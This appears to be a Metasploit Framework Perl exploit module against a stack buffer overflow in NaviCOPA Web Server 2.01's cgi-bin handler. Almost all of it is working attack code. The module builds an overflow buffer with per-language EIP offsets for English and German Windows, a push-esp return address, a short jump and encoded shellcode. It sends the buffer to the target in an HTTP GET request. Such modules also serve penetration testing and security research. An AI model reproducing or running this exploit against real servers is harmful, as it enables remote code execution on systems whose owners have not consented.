NaviCOPA Web Server 2.01 Remote Buffer Overflow Exploit (meta)
==============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::naviCopa_cgi;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;    => &#039;Buffer Overflow in NaviCopa HTTP server 2.01 (cgi-bin)&#039;,
	&#039;Version&#039; => &#039;$Rev: 3818 $&#039;,
	&#039;Authors&#039; => [ &#039;www.skillTube.com&#039;, ],

	&#039;Arch&#039;  => [ &#039;x86&#039; ],
	&#039;OS&#039;    => [ &#039;win32&#039; ],
	&#039;Priv&#039;  => 1,

	&#039;AutoOpts&#039; => { &#039;EXITFUNC&#039; => &#039;process&#039; },
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 80],
		&#039;URL&#039;   => [1, &#039;DATA&#039;, &#039;The URL to the cgi-bin&#039;, &#039;/cgi-bin/&#039;],
		&#039;SSL&#039;   => [0, &#039;BOOL&#039;, &#039;Use SSL&#039;],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Space&#039;     => 900,
		&#039;BadChars&#039;  => "\x00\x26\x3d\x0a\x0d\x25\x2b\x2e\x3f",
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
        This module exploits a stack overflow in the NaviCopa HTTP server 
	2.01 (release version 6th October 2006 or earlier). It is not the
	same vulnerability as the one described in BID 20250. 

	The vulnerability was found by a member of skillTube.com and
	allows reliable code execution. The only thing that may vary
	is the path to the NaviCopa installation folder. On an English
	version of Windows, it resides in the c:\\program files\\navicopa
	directory. In that case, eip is overwritten with char 271 to 274. 
	
	To add a new target version of Windows (e.g. Spanish, Italian etc.),
	you only need to change the offset to eip. As an example, in a 
	German version of Windows, the installation directory of navicopa is
	c:\\programme\\navicopa. As a result, the path length is four characters 
	shorter than on an English version of Windows. As a consequence, the
	offset to eip has to be increased by four. 

	Exploit was successfully tested against Windows 2000, XP and
	Windows Vista (regardless of ASLR).  		
}),

	&#039;Refs&#039;  =>  [
		[&#039;URL&#039;, &#039;http://www.skilltube.com&#039;],
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; =>
	  [
		[&#039;Universal exploit for all English versions of Windows (XP,2000,Vista)&#039;, 270,  0x1002c46f],  # push esp, retn 
		[&#039;Universal exploit for all German versions of Windows (XP,2000,Vista)&#039;, 274,  0x1002c46f],  # push esp, retn 
	  ],

	&#039;Keys&#039; => [&#039;naviCopa&#039;],

	&#039;DisclosureDate&#039; => &#039;March 2007&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}


sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_path = $self->GetVar(&#039;URL&#039;);
	my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
	my $shellcode   =$self->GetVar(&#039;EncodedPayload&#039;)->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $pattern = "A"x900;
	my $jmp = "\xeb\x04";

	substr($pattern, $target->[1]    , 4, pack(&#039;V&#039;, $target->[2])); # ret
	substr($pattern, $target->[1] + 42, length($jmp), $jmp);
	substr($pattern, $target->[1] + 44   , 4, pack(&#039;V&#039;, $target->[2])); #edx 
	substr($pattern, $target->[1] + 48 , length($shellcode), $shellcode);

	my $request =
	  "GET $target_path$pattern HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
	$s->Send($request);

	$self->PrintLine("[*] Waiting for a response...");
	my $r = $s->Recv(-1, 5);
	$s->Close();

	return;
}

1;



